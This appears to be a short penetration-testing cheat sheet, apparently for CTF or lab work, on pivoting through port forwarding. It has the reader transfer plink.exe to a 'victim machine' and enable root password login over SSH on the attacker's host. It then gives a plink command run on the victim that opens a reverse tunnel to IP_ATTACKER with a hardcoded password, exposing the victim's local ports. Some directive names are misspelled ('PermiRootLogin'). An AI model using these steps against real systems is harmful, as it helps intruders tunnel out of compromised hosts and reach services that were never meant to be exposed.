# Port Forwarding

* Download plink.exe -> https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
* Transfer plink to the victim machine
* apt install ssh -> On linuc
* Edit /etc/ssh/sshd_config, change #PermiRootLogin prohibit-password to PermiRootLogin yes
* ssh service restart
* ssh service start
[+] On the windows victim machine
* plink.exe -l root -pw toor -R PORT:127.0.0.1:PORT IP_ATTACKER
* y

[!] TRY TO USE THE ENTER KEY A COUPLE OF TIMES IN CASE YOU DON'T SEE NOTHING
